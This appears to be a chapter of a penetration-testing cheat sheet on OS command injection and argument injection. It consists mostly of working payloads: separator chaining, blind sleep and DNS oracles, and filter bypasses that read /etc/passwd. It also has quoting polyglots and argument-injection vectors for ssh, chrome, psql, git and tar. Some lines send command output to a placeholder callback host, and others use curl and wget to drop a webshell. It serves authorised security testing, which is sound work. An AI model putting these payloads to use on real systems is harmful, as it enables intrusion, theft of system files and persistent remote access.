# Ch08 — OS Command Injection & Argument Injection

> Chaining/substitution payloads, whitespace/character/filter bypasses, blind (time/DNS) channels, argument injection vectors.
> Sources: `Command Injection/` (README), plus argument-injection references.

**Route here when**: input reaches `system()`/`exec()`/`popen()`/shell — ping/dnslookup/convert/report tools, filename or IP params processed by shell commands.

**Safety**: prove with `id`, `hostname`, `whoami`, `sleep`, `echo MARKER > /tmp/x` — no shells, no writes outside `/tmp`, no `rm`.

## Detection — chaining and substitution

App runs `ping -c 4 INPUT`. Break the command line:

```powershell
127.0.0.1;id
127.0.0.1|id
127.0.0.1||id
127.0.0.1&&id
127.0.0.1%0aid
127.0.0.1%0als
`id`                      # backtick substitution inside the command
$(id)                     # $() substitution
;id;                      # leading separator keeps original cmd valid
|id|
&whoami&                  # background chaining
```

| Separator | Meaning |
|---|---|
| `;` | run sequentially regardless |
| `&&` | second runs if first succeeds |
| `\|\|` | second runs if first fails |
| `&` | background first, run second |
| `\|` | pipe stdout → stdin |
| `%0a` (`\n`) | newline = command separator |
| `` ` `` / `$()` | command substitution |

## Blind confirmation (no output)

```bash
;sleep 5
|sleep 5
&&sleep 5
$(sleep 5)
`ping -c 5 127.0.0.1`
%0asleep%205
```

Timing oracle: response delayed ~5s → command ran. Calibrate against baseline (network jitter) and try `sleep 10` to confirm linear scaling.

**OOB / DNS readout** (when time-based is flaky or egress DNS is allowed):

```bash
;nslookup YOUR-CALLBACK
;dig YOUR-CALLBACK
;for i in $(ls /); do host "$i.YOUR-CALLBACK"; done
&curl http://YOUR-CALLBACK/`id|base64`              # when outbound HTTP allowed
```

Interactsh/dnsbin/Burp Collaborator as listeners. DNS works when HTTP egress is blocked; only use infrastructure you control.

## Time-based per-char readout

```bash
if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi    # delay = char matches
if [ $(whoami|cut -c 2) == w ]; then sleep 5; fi
```

## Filter bypasses — whitespace

```powershell
cat${IFS}/etc/passwd          # $IFS = default field separator
ls${IFS}-la
{cat,/etc/passwd}             # brace expansion → words
cat</etc/passwd               # input redirection — no space needed
X=$'uname\x20-a'&&$X          # ANSI-C quoting builds the command
;ls%09-al%09/home             # TAB (%09) as separator
ping%CommonProgramFiles:~10,-18%127.0.0.1   # Windows var-substring = space
```

## Filter bypasses — keywords/characters

```powershell
w'h'o'am'i                    # single quotes break the token
w"h"o"am"i                    # double quotes
wh``oami                      # empty backticks
who$@ami                      # $@ expands to nothing
who$()ami                     # empty $() expands to nothing
who$(echo am)i
w\ho\am\i                     # backslash escapes
/\b\i\n/////s\h               # slash/run
/???/??t /???/p??s??          # glob wildcards → /bin/cat /etc/passwd
powershell C:\*\*2\n??e*d.*?  # Windows glob → notepad
wHoAmi                        # Windows case-insensitive
```

**Slash filtered**:

```powershell
${HOME:0:1}                   # → '/'
cat ${HOME:0:1}etc${HOME:0:1}passwd
echo . | tr '!-0' '"-1'       # → '/'
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

**Hex/char encoding**:

```powershell
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"    # → /etc/passwd
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
xxd -r -p <<< 2f6574632f706173737764                       # hex → text
swissky@x:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
```

**Line continuation** (multi-part keywords):

```powershell
cat /et\
c/pa\
sswd
# URL: cat%20/et%5C%0Ac/pa%5C%0Asswd
```

**Variable indirection**:

```powershell
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}        # → /etc/passwd
cat ${test//hh??hm/}
echo ~+ ; echo ~-            # tilde expansion → PWD / OLDPWD
```

## Polyglot command injection (unknown quoting context)

```powershell
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```

```powershell
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

Both fire inside bare, single-quoted, and double-quoted command contexts.

## Argument injection (input is a CLI argument, not a command)

When the app runs `cmd INPUT` and you can only add flags — inject an option that executes or writes:

```powershell
chrome '--gpu-launcher="id>/tmp/foo"'
ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
psql -o'|id>/tmp/foo'
git '--exec=...' / tar '--checkpoint-action=exec=...'
```

Ref: Sonar "Argument Injection Vectors" list — look up the binary, find an exec/output flag.

**Write-redirect variant** (drop a webshell/config via the tool's own `-o`/`--output`):

```powershell
curl http://YOUR-HOST/shell -o webshell.php
wget http://YOUR-HOST/shell -O /var/www/html/x.php
```

**WorstFit (Windows)**: `＂ --use-askpass=calc ＂` — fullwidth quotes (U+FF02) round-trip through ANSI escaping and re-activate quoting — escapes `escapeshellarg`-style wrappers.

## Tricks

- `nohup cmd > /dev/null &` — background long-running work so the injection call doesn't time out.
- `--` ends option parsing — use it before your injected argument to neutralize trailing flags.
- Windows note: `wHoAmi`, `PoWeRsHeLl`, `c:\*\*32\c*?c.e?e` — case and glob abuse both apply.
